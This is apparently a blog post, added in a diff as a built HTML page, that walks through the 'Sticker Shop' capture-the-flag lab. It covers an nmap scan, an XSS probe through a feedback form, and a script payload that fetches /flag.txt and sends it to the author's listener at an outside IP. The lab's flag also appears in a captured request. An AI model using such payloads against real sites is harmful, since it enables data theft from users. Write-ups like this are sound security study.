@@ -1,0 +1,208 @@
+<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🧿</text></svg>"><meta name="generator" content="Astro v4.16.8"><!-- Canonical URL --><link rel="canonical" href="https://astro-micro.vercel.app/journal/00-sticker-shop/"><!-- Primary Meta Tags --><title>The Sticker Shop | Thoughtbin</title><meta name="title" content="The Sticker Shop | Thoughtbin"><meta name="description" content="Sticker shop web app with identified Cross-Site Scripting (XSS) vulnerability "><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://astro-micro.vercel.app/journal/00-sticker-shop/"><meta property="og:title" content="The Sticker Shop | Thoughtbin"><meta property="og:description" content="Sticker shop web app with identified Cross-Site Scripting (XSS) vulnerability "><meta property="og:image" content="https://astro-micro.vercel.app/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://astro-micro.vercel.app/journal/00-sticker-shop/"><meta property="twitter:title" content="The Sticker Shop | Thoughtbin"><meta property="twitter:description" content="Sticker shop web app with identified Cross-Site Scripting (XSS) vulnerability "><meta property="twitter:image" content="https://astro-micro.vercel.app/blog-placeholder-1.jpg"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script>
+  function init() {
+    preloadTheme();
+    onScroll();
+    animate();
+    updateThemeButtons();
+
+    const backToTop = document.getElementById("back-to-top");
+    backToTop?.addEventListener("click", (event) => scrollToTop(event));
+
+    const backToPrev = document.getElementById("back-to-prev");
+    backToPrev?.addEventListener("click", () => window.history.back());
+
+    const lightThemeButton = document.getElementById("light-theme-button");
+    lightThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "light");
+      toggleTheme(false);
+      updateThemeButtons();
+    });
+
+    const darkThemeButton = document.getElementById("dark-theme-button");
+    darkThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "dark");
+      toggleTheme(true);
+      updateThemeButtons();
+    });
+
+    const systemThemeButton = document.getElementById("system-theme-button");
+    systemThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "system");
+      toggleTheme(window.matchMedia("(prefers-color-scheme: dark)").matches);
+      updateThemeButtons();
+    });
+
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (event) => {
+        if (localStorage.theme === "system") {
+          toggleTheme(event.matches);
+        }
+      });
+
+    document.addEventListener("scroll", onScroll);
+  }
+
+  function updateThemeButtons() {
+    const theme = localStorage.getItem("theme");
+    const lightThemeButton = document.getElementById("light-theme-button");
+    const darkThemeButton = document.getElementById("dark-theme-button");
+    const systemThemeButton = document.getElementById("system-theme-button");
+
+    function removeActiveButtonTheme(button) {
+      button?.classList.remove("bg-black/5");
+      button?.classList.remove("dark:bg-white/5");
+    }
+
+    function addActiveButtonTheme(button) {
+      button?.classList.add("bg-black/5");
+      button?.classList.add("dark:bg-white/5");
+    }
+
+    removeActiveButtonTheme(lightThemeButton);
+    removeActiveButtonTheme(darkThemeButton);
+    removeActiveButtonTheme(systemThemeButton);
+
+    if (theme === "light") {
+      addActiveButtonTheme(lightThemeButton);
+    } else if (theme === "dark") {
+      addActiveButtonTheme(darkThemeButton);
+    } else {
+      addActiveButtonTheme(systemThemeButton);
+    }
+  }
+
+  function animate() {
+    const animateElements = document.querySelectorAll(".animate");
+
+    animateElements.forEach((element, index) => {
+      setTimeout(() => {
+        element.classList.add("show");
+      }, index * 100);
+    });
+  }
+
+  function onScroll() {
+    if (window.scrollY > 0) {
+      document.documentElement.classList.add("scrolled");
+    } else {
+      document.documentElement.classList.remove("scrolled");
+    }
+  }
+
+  function scrollToTop(event) {
+    event.preventDefault();
+    window.scrollTo({
+      top: 0,
+      behavior: "smooth",
+    });
+  }
+
+  function toggleTheme(dark) {
+    const css = document.createElement("style");
+
+    css.appendChild(
+      document.createTextNode(
+        `* {
+             -webkit-transition: none !important;
+             -moz-transition: none !important;
+             -o-transition: none !important;
+             -ms-transition: none !important;
+             transition: none !important;
+          }
+        `,
+      ),
+    );
+
+    document.head.appendChild(css);
+
+    if (dark) {
+      document.documentElement.classList.add("dark");
+    } else {
+      document.documentElement.classList.remove("dark");
+    }
+
+    window.getComputedStyle(css).opacity;
+    document.head.removeChild(css);
+  }
+
+  function preloadTheme() {
+    const userTheme = localStorage.theme;
+
+    if (userTheme === "light" || userTheme === "dark") {
+      toggleTheme(userTheme === "dark");
+    } else {
+      toggleTheme(window.matchMedia("(prefers-color-scheme: dark)").matches);
+    }
+  }
+
+  document.addEventListener("DOMContentLoaded", () => init());
+  document.addEventListener("astro:after-swap", () => init());
+  preloadTheme();
+</script><link rel="stylesheet" href="/_astro/index.v31EH7fp.css">
+<style>summary[data-astro-cid-xvrfupwn]{cursor:pointer;border-top-left-radius:.5rem;border-top-right-radius:.5rem;padding:.375rem .75rem;font-weight:500;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}summary[data-astro-cid-xvrfupwn]:hover{background-color:#0000000d}summary[data-astro-cid-xvrfupwn]:hover:is(.dark *){background-color:#ffffff0d}details[data-astro-cid-xvrfupwn][open] summary[data-astro-cid-xvrfupwn]{background-color:#0000000d}details[data-astro-cid-xvrfupwn][open] summary[data-astro-cid-xvrfupwn]:is(.dark *){background-color:#ffffff0d}
+</style><script type="module" src="/_astro/hoisted.2daoxv0f.js"></script></head> <body> <header data-astro-transition-persist="astro-l7r54iwe-1"> <div class="mx-auto max-w-screen-sm px-3"> <div class="flex flex-wrap justify-between gap-y-2"> <a href="/" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out">  <div class="font-semibold"> Thoughtbin&nbsp;
+</div>  </a> <nav class="flex items-center gap-1 text-sm"> <a href="/journal" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> journal </a> <span> / </span> <a href="/tags" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> tags </a> <span> / </span> <a href="/about" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> about </a> </nav> </div> </div> </header> <main>  <div class="mx-auto max-w-screen-sm px-3"> <div class="animate"> <a href="/journal" class="not-prose group relative flex w-fit flex-nowrap rounded border border-black/15 py-1.5 pl-7 pr-3 transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-4 -translate-y-1/2 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-2 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="text-sm"> Back to journal </div> </a> </div> <div class="my-10 space-y-1"> <div class="animate flex items-center gap-1.5"> <div class="font-base text-sm"> <time datetime="2024-12-04T00:00:00.000Z"> December 04, 2024 </time> </div>
+&bull;
+<div class="font-base text-sm"> 3 min read </div> </div> <h1 class="animate text-3xl font-semibold text-black dark:text-white"> The Sticker Shop </h1> <div class="animate flex gap-2 pt-1"> <a href="/tags/XSS" class="rounded border border-black/15 px-2 py-1 text-sm transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> XSS </a> </div> </div> <details open class="animate rounded-lg border border-black/15 dark:border-white/20" data-astro-cid-xvrfupwn> <summary data-astro-cid-xvrfupwn>Table of Contents</summary> <nav class="" data-astro-cid-xvrfupwn> <ul class="py-3" data-astro-cid-xvrfupwn> <li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#overview" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Overview </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#network-scan" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Network Scan </a> <ul class="translate-x-3"> <li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#nmap-scan" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Nmap Scan </a>  </li> </ul> </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#website-interaction" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Website Interaction </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#feedback-form-and-xss-testing" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Feedback Form and XSS Testing </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#exploiting-xss-to-steal-flag" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Exploiting XSS to Steal Flag </a>  </li> </ul> </nav> </details> <article class="animate"> <h2 id="overview">Overview</h2>
+<p>During this Capture the Flag (CTF) challenge, the goal was to exploit vulnerabilities in <strong>The Sticker Shop</strong> web application. The primary vulnerability identified was <strong>Cross-Site Scripting (XSS)</strong>, which allowed the injection of malicious scripts, ultimately leading to the extraction of the flag located at <code>/flag.txt</code>.</p>
+<hr>
+<h2 id="network-scan">Network Scan</h2>
+<h3 id="nmap-scan">Nmap Scan</h3>
+<p>A network scan was performed on the target machine at IP <code>10.10.181.208</code> to gather information about open ports and services. The following results were obtained:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0" data-language="txt"><code><span class="line"><span>$ nmap -A 10.10.181.208</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Nmap Scan Results for 10.10.181.208</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Host is up (0.24s latency).</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>PORT STATE SERVICE VERSION</span></span>
+<span class="line"><span>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="line"><span>8080/tcp open http-proxy Werkzeug/3.0.1 Python/3.8.10</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Nmap done at Sat Nov 30 23:55:20 2024 -- 1 IP address (1 host up) scanned in 143.61 seconds</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span></code></pre>
+<p>The scan revealed two open ports:</p>
+<ul>
+<li><strong>Port 22</strong>: SSH service</li>
+<li><strong>Port 8080</strong>: HTTP proxy service running on <strong>Werkzeug/3.0.1</strong> and <strong>Python/3.8.10</strong></li>
+</ul>
+<h2 id="website-interaction">Website Interaction</h2>
+<p>Upon visiting <code>http://10.10.181.208:8080</code>, the homepage displayed two stickers and their respective prices.</p>
+<p><img src="/public/home.png" alt="Homepage"></p>
+<p>Efforts to access the <strong>flag</strong> at <code>/flag.txt</code> returned a <strong>401 Unauthorized</strong> status, indicating that the flag was secured and could not be accessed directly.</p>
+<p><img src="/public/unauth.png" alt="Unauthorized"></p>
+<hr>
+<h2 id="feedback-form-and-xss-testing">Feedback Form and XSS Testing</h2>
+<p><img src="/public/feedback.png" alt="feedback"></p>
+<p>The application features a feedback form that allows users to submit comments. To test for <strong>Cross-Site Scripting (XSS)</strong> vulnerabilities, a simple payload was injected:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-color-text)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">img</span><span style="color:var(--astro-code-token-function)"> src</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"http://10.8.84.12:8081/test"</span><span style="color:var(--astro-code-color-text)"> /></span></span>
+<span class="line"></span></code></pre>
+<p>This payload attempts to load an image from an external server, allowing for the detection of improper input handling.</p>
+<p>A basic HTTP server was set up at <a href="http://10.8.84.12:8081">http://10.8.84.12:8081</a> to monitor incoming requests:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:var(--astro-code-token-function)">python3</span><span style="color:var(--astro-code-token-string)"> -m</span><span style="color:var(--astro-code-token-string)"> http.server</span><span style="color:var(--astro-code-token-constant)"> 8081</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">10.10.181.208</span><span style="color:var(--astro-code-token-string)"> -</span><span style="color:var(--astro-code-token-string)"> -</span><span style="color:var(--astro-code-color-text)"> [04/Dec/2024 </span><span style="color:var(--astro-code-token-string)">13:52:30]</span><span style="color:var(--astro-code-token-string-expression)"> "GET / HTTP/1.1"</span><span style="color:var(--astro-code-token-constant)"> 200</span><span style="color:var(--astro-code-token-string)"> -</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">10.10.181.208</span><span style="color:var(--astro-code-token-string)"> -</span><span style="color:var(--astro-code-token-string)"> -</span><span style="color:var(--astro-code-color-text)"> [04/Dec/2024 </span><span style="color:var(--astro-code-token-string)">13:52:41]</span><span style="color:var(--astro-code-token-string-expression)"> "GET / HTTP/1.1"</span><span style="color:var(--astro-code-token-constant)"> 200</span><span style="color:var(--astro-code-token-string)"> -</span></span>
+<span class="line"></span></code></pre>
+<p>This confirmed that the site was vulnerable to XSS, as the payload was executed and the request was made to the server.</p>
+<h2 id="exploiting-xss-to-steal-flag">Exploiting XSS to Steal Flag</h2>
+<p><img src="/public/query.png" alt="xss"></p>
+<p>The input field was vulnerable to XSS, allowing the injection of a JavaScript payload to fetch the contents of the <code>/flag.txt</code> file. Since only GET requests were allowed, the flag could not be directly posted but could be fetched and sent via a redirect.</p>
+<p>The following JavaScript payload was crafted:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:var(--astro-code-color-text)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-color-text)">></span></span>
+<span class="line"><span style="color:var(--astro-code-color-text)">  fetch('/flag.txt').then(response=>response.text()) .then(data=>{</span><span style="color:var(--astro-code-token-string-expression)">" "</span><span style="color:var(--astro-code-color-text)">}</span></span>
+<span class="line"><span style="color:var(--astro-code-color-text)">  {</span></span>
+<span class="line"><span style="color:var(--astro-code-color-text)">    (</span><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-color-text)">.</span><span style="color:var(--astro-code-token-constant)">location</span><span style="color:var(--astro-code-color-text)">.href </span><span style="color:var(--astro-code-token-keyword)">=</span></span>
+<span class="line"><span style="color:var(--astro-code-token-string-expression)">      "http://10.8.84.12:8081/?flag"</span><span style="color:var(--astro-code-token-keyword)"> +</span><span style="color:var(--astro-code-token-function)"> encodeURIComponent</span><span style="color:var(--astro-code-color-text)">(data))</span></span>
+<span class="line"><span style="color:var(--astro-code-color-text)">  }</span></span>
+<span class="line"><span style="color:var(--astro-code-color-text)">  )</span></span>
+<span class="line"><span style="color:var(--astro-code-color-text)">&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-color-text)">></span></span>
+<span class="line"></span></code></pre>
+<p>This script makes a GET request to /flag.txt, retrieves the flag, and redirects to an external server (<a href="http://10.8.84.12:8081">http://10.8.84.12:8081</a>), appending the flag as a URL parameter.</p>
+<p>The payload was submitted through the feedback form, and the following request was captured on the server:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:var(--astro-code-token-constant)">10.10</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">181</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">208 </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-keyword)"> -</span><span style="color:var(--astro-code-color-text)"> [</span><span style="color:var(--astro-code-token-constant)">04</span><span style="color:var(--astro-code-token-keyword)">/</span><span style="color:var(--astro-code-color-text)">Dec</span><span style="color:var(--astro-code-token-keyword)">/</span><span style="color:var(--astro-code-token-constant)">2024</span><span style="color:var(--astro-code-token-constant)"> 14</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-constant)">05</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-constant)">41</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-string-expression)">"GET /?flag=THM%7B83789a69074f6364a38879cfcabe8b62305ee6%7D HTTP/1.1"</span><span style="color:var(--astro-code-token-constant)"> 200</span><span style="color:var(--astro-code-token-keyword)"> -</span></span>
+<span class="line"></span></code></pre> <div class="mt-24"> <div class="grid grid-cols-2 gap-1.5 sm:gap-3"> <div class="invisible"></div> <div class="invisible"></div> </div> </div> </article> </div>  </main> <footer class="animate"> <div class="mx-auto max-w-screen-sm px-3"> <div class="relative"> <div class="absolute -top-12 right-0"> <button id="back-to-top" class="group relative flex w-fit flex-nowrap rounded border border-black/15 py-1.5 pl-8 pr-3 transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-4 -translate-y-1/2 rotate-90 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-2 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="text-sm">Back to top</div> </button> </div> </div> <div class="flex items-center justify-between"> <div>&copy; 2024 • Thoughtbin 🧿</div> <div class="flex flex-wrap items-center gap-1.5"> <button id="light-theme-button" aria-label="Light theme" class="group flex size-9 items-center justify-center rounded border border-black/15 hover:bg-black/5 focus-visible:bg-black/5 dark:border-white/20 dark:hover:bg-white/5 dark:focus-visible:bg-white/5"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black group-hover:dark:stroke-white dark:group-focus-visible:stroke-white"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <button id="dark-theme-button" aria-label="Dark theme" class="group flex size-9 items-center justify-center rounded border border-black/15 hover:bg-black/5 focus-visible:bg-black/5 dark:border-white/20 dark:hover:bg-white/5 dark:focus-visible:bg-white/5"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black group-hover:dark:stroke-white dark:group-focus-visible:stroke-white"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> </button> <button id="system-theme-button" aria-label="System theme" class="group flex size-9 items-center justify-center rounded border border-black/15 hover:bg-black/5 focus-visible:bg-black/5 dark:border-white/20 dark:hover:bg-white/5 dark:focus-visible:bg-white/5"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black group-hover:dark:stroke-white dark:group-focus-visible:stroke-white"> <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect> <line x1="8" y1="21" x2="16" y2="21"></line> <line x1="12" y1="17" x2="12" y2="21"></line> </svg> </button> </div> </div> </div> </footer> </body></html>
